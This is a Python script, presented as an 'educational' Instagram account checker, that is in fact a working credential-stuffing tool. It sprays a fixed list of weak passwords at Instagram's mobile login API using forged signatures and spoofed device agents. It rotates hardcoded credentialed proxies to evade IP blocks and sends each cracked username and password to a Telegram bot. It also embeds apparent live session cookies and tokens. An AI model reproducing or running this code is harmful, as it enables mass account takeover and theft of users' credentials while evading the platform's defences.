# mYCheckerForInstagram
# Telegram: @hd0rr

# DISCLAIMER:
# This tool is intended for educational purposes only.
# Unauthorized use is illegal, and the developer assumes no responsibility for any misuse by others.

# --- Details ---
# Version: 1.0 (Throttling Logic Added)
# Date: 2025-08-02

# --- Features ---
# - Instagram account checker.
# - Supports multi-threading and proxies (auto-switches blocked proxies).
# - Checks usernames from usernames.txt against a fixed password list (fixedPasswords, limited to 20 passwords).
# - Implements throttling to prevent bans from consecutive invalid user errors.

import requests, time, uuid, hashlib, hmac, random, json, sys, os, threading
from queue import Queue
from dotenv import load_dotenv
load_dotenv()
class iNstagramChecker:

    class Colors:
        RESET = '\033[0m'
        BOLD = '\033[1m'
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        CYAN = '\033[96m'
        MAGENTA = '\033[95m'

    def __init__(self):
        self.cursorUpOne = '\x1b[1A'
        self.eraseLine = '\x1b[2K'

        self.token = os.getenv("BOT_TOKEN")
        self.idd = int(os.getenv("CHAT_ID"))
       

        self.proxiesList = [
            "uphrtpvo:hlrgarxoitwa@23.95.150.145:6114",
            "uphrtpvo:hlrgarxoitwa@198.23.239.134:6540",
            "uphrtpvo:hlrgarxoitwa@45.38.107.97:6014",
            "uphrtpvo:hlrgarxoitwa@107.172.163.27:6543",
            "uphrtpvo:hlrgarxoitwa@64.137.96.74:6641",
            "uphrtpvo:hlrgarxoitwa@45.43.186.39:6257",
            "uphrtpvo:hlrgarxoitwa@154.203.43.247:5536",
            "uphrtpvo:hlrgarxoitwa@216.10.27.159:6837",
            "uphrtpvo:hlrgarxoitwa@136.0.207.84:6661",
            "uphrtpvo:hlrgarxoitwa@142.147.128.93:6593",
            "yiclerdx:9meb73kp2ddp@23.95.150.145:6114",
            "yiclerdx:9meb73kp2ddp@198.23.239.134:6540",
            "yiclerdx:9meb73kp2ddp@45.38.107.97:6014",
            "yiclerdx:9meb73kp2ddp@207.244.217.165:6712",
            "yiclerdx:9meb73kp2ddp@107.172.163.27:6543",
            "yiclerdx:9meb73kp2ddp@104.222.161.211:6343",
            "yiclerdx:9meb73kp2ddp@64.137.96.74:6641",
            "yiclerdx:9meb73kp2ddp@216.10.27.159:6837",
            "yiclerdx:9meb73kp2ddp@136.0.207.84:6661",
            "yiclerdx:9meb73kp2ddp@142.147.128.93:6593",
            "epjcuskf:g8w39g5us9mn@23.95.150.145:6114",
            "epjcuskf:g8w39g5us9mn@198.23.239.134:6540",
            "epjcuskf:g8w39g5us9mn@45.38.107.97:6014",
            "epjcuskf:g8w39g5us9mn@207.244.217.165:6712",
            "epjcuskf:g8w39g5us9mn@107.172.163.27:6543",
            "epjcuskf:g8w39g5us9mn@104.222.161.211:6343",
            "epjcuskf:g8w39g5us9mn@64.137.96.74:6641",
            "epjcuskf:g8w39g5us9mn@216.10.27.159:6837",
            "epjcuskf:g8w39g5us9mn@136.0.207.84:6661",
            "epjcuskf:g8w39g5us9mn@142.147.128.93:6593",
            "cusvepep:aidawke2ysme@23.95.150.145:6114",
            "cusvepep:aidawke2ysme@198.23.239.134:6540",
            "cusvepep:aidawke2ysme@45.38.107.97:6014",
            "cusvepep:aidawke2ysme@207.244.217.165:6712",
            "cusvepep:aidawke2ysme@107.172.163.27:6543",
            "cusvepep:aidawke2ysme@104.222.161.211:6343",
            "cusvepep:aidawke2ysme@64.137.96.74:6641",
            "cusvepep:aidawke2ysme@216.10.27.159:6837",
            "cusvepep:aidawke2ysme@136.0.207.84:6661",
            "cusvepep:aidawke2ysme@142.147.128.93:6593",
        ]

        self.stats = {
            "good": 0,
            "bad": 0,
            "error": "NEY",
            "total_checked": 0,
            "current_user": "N/A",
            "lock": threading.Lock(),
            "proxy_lock": threading.Lock(),
            "proxy_index": -1
        }

        self.fixedPasswords = [
            "mmnnbbvv","zzzzxxxx","123456@@","mmmmnnnn", "aassddff", "Aa112233@", "qqwweerr",
            "qwertqwert", "qwerqwer", "qqqqwwww", "Aa123456@","aaaassss",
            "zzxxccvv", "1234@@@@", "11223344@@","Aa@123456"
        ]

    def pRintLogo(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        logo = f"""
{self.Colors.CYAN}{self.Colors.BOLD}
 _  __ _           _    
| |/ /| |__   __ _| |
| \' / | \'_ \ / _` | |
| . \ | | | | (_| | |  
|_|\\_\\|_| |_|\\__,_|_|
                         
    {self.Colors.RESET}
{self.Colors.MAGENTA}mYCheckerForInstagram {self.Colors.RESET}| {self.Colors.YELLOW}Telegram: @hd0rr{self.Colors.RESET}
        """
        print(f"{self.Colors.RED}# This tool is intended for educational purposes only.\n It is illegal to use it for unauthorized activities, and I do not take responsibility for any misuse by others.")
        print(logo)
        print("\n" * 4)

    def pRintStatus(self):
        sys.stdout.write(self.cursorUpOne * 4)
        
        statusLine = (
            f"{self.Colors.BOLD}Checked: {self.Colors.CYAN}{self.stats['total_checked']}{self.Colors.RESET} | "
            f"{self.Colors.GREEN}Good: {self.stats['good']}{self.Colors.RESET} | "
            f"{self.Colors.YELLOW}Bad: {self.stats['bad']}{self.Colors.RESET}"
        )
        userLine = f"{self.Colors.BOLD}Username: {self.Colors.CYAN}{self.stats['current_user']}{self.Colors.RESET}"
        errorLine = f"{self.Colors.BOLD}Status: {self.Colors.RED}{self.stats['error']}{self.Colors.RESET}"

        sys.stdout.write(self.eraseLine + statusLine + "\n")
        sys.stdout.write(self.eraseLine + userLine + "\n")
        sys.stdout.write(self.eraseLine + errorLine + "\n\n")
        sys.stdout.flush()

    def gEtNextProxy(self):
        with self.stats["proxy_lock"]:
            self.stats["proxy_index"] += 1
            if self.stats["proxy_index"] >= len(self.proxiesList):
                self.stats["proxy_index"] = 0
                self.stats["error"] = "All proxies used. Restarting list."
                self.pRintStatus()
                time.sleep(1)
            
            proxyUrl = f"http://{self.proxiesList[self.stats['proxy_index']]}"
            self.stats["error"] = f"Switched to new proxy: {proxyUrl.split('@' )[-1]}"
            return {"http": proxyUrl, "https": proxyUrl}
        
    def gEtInfoAccount(self, username, password ):
        headers = {
			'Accept': '*/*',
			'Cookie': 'mid=ZHTlnQALAAFHZAE8G64BeLHXNMv6; ig_did=ACB29C06-4F89-4B7A-9D37-DC433D1E9398; ig_nrcb=1; datr=nUZ1ZAphhPG3siVLQu3QFbkq; fbm_124024574287414=base_domain=.instagram.com; csrftoken=1gI1BSItuCt7GpIB7BL3KCrapTfKligx; ds_user_id=55002803434; sessionid=55002803434%3A1m1laRSPbJaoKD%3A24%3AAYdWXJwfQhhN68tU0NIkcNODEtrIYnAgKCWPkrp3Rg; shbid="12254\05455002803434\0541717693792:01f7d20c44658c09775e0f963159681bf19a10be70bbe95b497a89f112ac2fc01ab50da0"; shbts="1686157792\05455002803434\0541717693792:01f7c175c7d720e51402db9b91b351fab16619ea5a91f0ce421bc4c9827bce14e62426c5"; fbsr_124024574287414=Z3GOftVJ7wWK4lDsT4vYGKDlPKHv5vYXWQpT8AYi130.eyJ1c2VyX2lkIjoiMTAwMDg3NjM5MTE3ODM3IiwiY29kZSI6IkFRRHRIbWwtakhjY25sQmxidDJmcGpDZmtLV2stb2FQY0lLbHpWQWtfMUlhLTNqMF9wdlhsaFUyTnJvYXRsT2lvUmJfSXNzc19oSXFyYzFRX3BLZ1RaX1RSTEhCbGpzRTFHZkFjWWJoX0Q4aVVwYWdSR2Q0bVNXcUVwai1SajlkT1J5RmxadzZHbWZCc0ZCbVdUY0RDNDAzUFVnTzV2TVBONk1UcmpSUDlpTU85dFdSc0hURFdsUVhrNDJycVhvbzM2SHlnYXRNdDJMRWlNNUZrcmVfRWtiWGUzTTlqdzY4enpKT2RVUjlIUmt2TUlXcWZqQ2RUc3FmYUo5MWowUF95bm9aLVZCSnpmb0xuSkt3MV9JTkFTQzdEZmM3ZURIeDFiTkFyRS1SQ1FhYUp3ZWtydVdzMFBYaV9pTDdYTlZrRTg5Yy1oYWVrWVI1YU45cDhwVXp0ZXBsIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUhiWkNnM3M0UXJRZmhyOXRaQm5mdHI2cTlsYXJNMnpRaFpDZTNlczJOTGkwNGc4NGJaQldRTWs4VlpDWkNZMVZ3ak52azJ4M0d0VkxaQTdPajhZWkFkNklDdUxtMjI0NllhVTZQdXRlMk1PU3haQnpxbDhxUnU2UDhRYTZnRXhpUGRRbHB5WWJYSmVRczB3N2UzdFRxZXdnQWdUYXNpYzRjd0d3MHpaQUxTdXNCVUN3Y0JnVnk3MmdaRCIsImFsZ29yaXRobSI6IkhNQUMtU0hBMjU2IiwiaXNzdWVkX2F0IjoxNjg2MjA3NDQ4fQ; rur="ODN\05455002803434\0541717743459:01f7dc2b656c6f698ae45a64240745cb3e01e62cb90350349fcf91dba76a5d92e481be60"',
			'Referer': 'https://www.instagram.com/5u2.a/',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
			'X-Csrftoken': '1gI1BSItuCt7GpIB7BL3KCrapTfKligx',
			'X-Ig-App-Id': '936619743392459',
			'X-Requested-With': 'XMLHttpRequest',}
        response = requests.get(f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}", headers=headers, timeout=15 ).json()
        name = response.get("data", {}).get("user", {}).get("full_name")
        userId = response.get("data", {}).get("user", {}).get("id")
        followers = response.get("data", {}).get("user", {}).get("edge_followed_by", {}).get("count")
        following = response.get("data", {}).get("user", {}).get("edge_follow", {}).get("count")
        bio = response.get("data", {}).get("user", {}).get("biography")
        accountInfo = f"""
*Nwe Account Instagram ✅*
---------------------------------------
*NAME:* `{name}`
*USERNAME:* `{username}`
*PASSWORD:* `{password}`
*FOLLOWERS:* {followers}
*FOLLOWING:* {following}
*BIO:* `{bio}`
*ID:* `{userId}`
---------------------------------------
*TELEGRAM:* @hd0rr
"""
        return accountInfo

    def sEndTelegramMessage(self, message):
        try:
            requests.get(f"https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.idd}&text={message}&parse_mode=Markdown" )
        except Exception as e:
            with self.stats["lock"]:
                self.stats["error"] = f"Telegram send failed: {e}"

    def gEnerateRandomUserAgent(self):
        osVersions = ["28", "29", "30", "31"]
        apiLevels = ["8", "9", "10"]
        dpis = ["240dpi", "280dpi", "300dpi", "320dpi", "400dpi", "420dpi", "480dpi", "560dpi", "640dpi"]
        resolutions = ["480x800", "720x1280", "800x1280", "1080x1920", "1080x2340", "1440x2560", "1440x3200"]
        manufacturers = ["samsung", "google", "xiaomi", "huawei", "oneplus", "oppo", "vivo"]
        models = ["SM-G965F", "Pixel 4", "Redmi Note 5", "SM-A505F", "SM-G960F", "Pixel 3a", "Redmi Note 9 Pro", "SM-J700H", "SM-G973F", "Pixel 2 XL", "Redmi 7A", "SM-A515F", "Pixel 5", "SM-J600F", "Redmi Go", "SM-T515", "Pixel 6", "SM-A715F", "Pixel 7", "SM-G973U", "Pixel 4a", "SM-A505U", "Pixel 3 XL", "SM-G960U", "Pixel 2", "SM-A305F", "Pixel 3 XL", "SM-G965U", "Pixel 4 XL", "SM-A505F", "Pixel 5a"]
        devices = ["star2lte", "flame", "whyred", "a50", "starqlte", "sargo", "joyeuse", "j7elte", "beyond1lte", "taimen", "pine", "a51", "redfin", "j6lte", "tiare", "sunfish", "lilac", "crownlte", "sunny", "bonito", "raven", "coral", "crosshatch", "blueline", "sailfish", "manta"]
        cpus = ["exynos9810", "qcom", "exynos9610", "exynos9820", "exynos7580", "exynos9611", "exynos7870", "exynos990", "qcom-msm8998", "qcom-sdm660", "qcom-sdm845", "qcom-sdm710", "qcom-sdm730", "qcom-sdm765", "qcom-sdm865", "qcom-sdm888", "qcom-sdm732", "qcom-sdm750", "qcom-sdm690", "qcom-sdm665", "qcom-sdm630", "qcom-sdm625", "qcom-sdm660", "qcom-sdm450", "qcom-sdm439", "qcom-sdm429", "qcom-sdm425"]
        locales = ["ar_AR", "en_US", "ru_RU", "en_GB", "fr_FR", "de_DE", "es_ES", "it_IT", "pt_BR", "tr_TR", "zh_CN", "ja_JP", "ko_KR"]
        buildNumbers = ["373310554"]

        osVersion = random.choice(osVersions)
        apiLevel = random.choice(apiLevels)
        dpi = random.choice(dpis)
        resolution = random.choice(resolutions)
        manufacturer = random.choice(manufacturers)
        model = random.choice(models)
        device = random.choice(devices)
        cpu = random.choice(cpus)
        locale = random.choice(locales)
        buildNumber = random.choice(buildNumbers)

        userAgentString = f"Instagram 237.0.0.14.102 Android ({osVersion}/{apiLevel}; {dpi}; {resolution}; {manufacturer}; {model}; {device}; {cpu}; {locale}; {buildNumber})"
        lang = locale.replace("_", "-")

        return {"ua": userAgentString, "lang": lang}

    def gEnerateDeviceInfo(self):
        return {"deviceId": f"android-{hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]}", "guid": str(uuid.uuid4()), "adid": str(uuid.uuid4()), "phoneId": str(uuid.uuid4())}

    def gEnerateSignature(self, data):
        key = b"6f0238725728f3a8362188e8582740b4024121a5d792a1e2dc6e375f0785ee94"
        return hmac.new(key, data.encode(), hashlib.sha256).hexdigest()

    def cHeckWorker(self, usernameQueue, delaySeconds):
        session = requests.Session()
        threadProxy = None
        
        consecutiveInvalidUserCounter = 0
        MaxConsecutiveInvalidUser = 10

        while not usernameQueue.empty():
            try:
                username = usernameQueue.get_nowait()
            except:
                break

            with self.stats["lock"]:
                self.stats["current_user"] = username
                self.pRintStatus()

            skipUser = False
            
            for password in self.fixedPasswords:
                deviceInfo = self.gEnerateDeviceInfo()
                selectedUa = self.gEnerateRandomUserAgent()

                headers = {
                    "Host": "i.instagram.com",
                    "User-Agent": selectedUa["ua"],
                    "X-IG-Connection-Type": "WIFI",
                    "X-IG-Capabilities": "3brTvwE=",
                    "Accept-Language": f"{selectedUa['lang']};q=0.9",
                    "X-Google-AD-ID": deviceInfo["adid"],
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                }

                timeStamp = str(int(time.time()))
                loginData = {
                    "jazoest": "22468",
                    "country_codes": """[{"country_code":"964","source":["sim"]},{"country_code":"54","source":["default"]}]""",
                    "phone_id": deviceInfo["phoneId"],
                    "enc_password": f"#PWD_INSTAGRAM:0:{timeStamp}:{password}",
                    "username": username,
                    "adid": deviceInfo["adid"],
                    "guid": deviceInfo["guid"],
                    "device_id": deviceInfo["deviceId"],
                    "google_tokens": "[]",
                    "login_attempt_count": "0",
                }

                payloadData = f"SIGNATURE.{json.dumps(loginData)}"
                signedData = payloadData.replace(
                    "SIGNATURE", self.gEnerateSignature(payloadData.split(".")[1])
                )
                
                try:
                    if threadProxy:
                        session.get(
                            "https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup",
                            headers=headers,
                            proxies=threadProxy,
                            timeout=10
                            )
                        response = session.post(
                            "https://i.instagram.com/api/v1/accounts/login/",
                            headers=headers,
                            data={"signed_body": signedData},
                            proxies=threadProxy,
                            timeout=10
                            )
                    else:
                        session.get(
                            "https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup",
                            headers=headers,
                            timeout=10
                            )
                        response = session.post(
                            "https://i.instagram.com/api/v1/accounts/login/",
                            headers=headers,
                            data={"signed_body": signedData},
                            timeout=10
                            )

                    ResponseData = response.json()
                    
                    if ResponseData.get("logged_in_user") or ResponseData.get("message") == "challenge_required":
                        consecutiveInvalidUserCounter = 0
                        with self.stats["lock"]:
                            self.stats["good"] += 1
                            self.stats["total_checked"] += 1
                            self.stats["error"] = f"SUCCESS! User: {username}"
                            self.pRintStatus()
                        accountInfo = self.gEtInfoAccount(username, password)
                        self.sEndTelegramMessage(accountInfo)
                        skipUser = True
                        break
                    
                    else:
                        errorType = ResponseData.get("error_type", "Unknown error")
                        
                        if errorType == "invalid_user":
                            consecutiveInvalidUserCounter += 1
                            with self.stats["lock"]:
                                self.stats["bad"] += 1
                                self.stats["total_checked"] += 1
                                self.stats["error"] = f"{password} - {errorType}"
                                self.pRintStatus()
                            skipUser = True
                            break
                        
                        consecutiveInvalidUserCounter = 0
                        with self.stats["lock"]:
                            self.stats["bad"] += 1
                            self.stats["total_checked"] += 1
                            self.stats["error"] = f"{password} - {errorType}"
                            self.pRintStatus()
                        
                        if errorType == "ip_block":
                            threadProxy = self.gEtNextProxy()

                except requests.exceptions.ProxyError:
                    consecutiveInvalidUserCounter = 0
                    with self.stats["lock"]:
                        self.stats["error"] = "Proxy Error. Switching..."
                        self.pRintStatus()
                    threadProxy = self.gEtNextProxy()
                except requests.exceptions.RequestException:
                    consecutiveInvalidUserCounter = 0
                    with self.stats["lock"]:
                        self.stats["error"] = "Network Error. Retrying..."
                        self.pRintStatus()

                time.sleep(delaySeconds)

            if skipUser:
                if consecutiveInvalidUserCounter >= MaxConsecutiveInvalidUser:
                    with self.stats["lock"]:
                        self.stats["error"] = f"Throttling for {delaySeconds}s due to too many invalid users."
                        self.pRintStatus()
                    time.sleep(delaySeconds)
                    consecutiveInvalidUserCounter = 0
                
                usernameQueue.task_done()
                continue

            consecutiveInvalidUserCounter = 0
            usernameQueue.task_done()

    def cHeckAccounts(self, fileName, delaySeconds, numThreads):
        try:
            with open(fileName, "r") as file:
                usernames = [line.strip() for line in file if line.strip()]
        except FileNotFoundError:
            with self.stats["lock"]:
                self.stats["error"] = f"Error: File \'{fileName}\' not found"
                self.pRintStatus()
            return

        usernameQueue = Queue()
        for user in usernames:
            usernameQueue.put(user)

        threads = []
        for _ in range(numThreads):
            t = threading.Thread(target=self.cHeckWorker, args=(usernameQueue, delaySeconds))
            t.daemon = True
            t.start()
            threads.append(t)

        try:
            while any(t.is_alive() for t in threads):
                time.sleep(0.5)
                with self.stats["lock"]:
                    self.pRintStatus()
        except KeyboardInterrupt:
            with self.stats["lock"]:
                self.stats["error"] = "Process interrupted by user"
                self.pRintStatus()
            sys.exit(0)

if __name__ == "__main__":
    checker = iNstagramChecker()
    checker.pRintLogo()
    checker.cHeckAccounts("usernames2.txt", delaySeconds=1, numThreads=6)
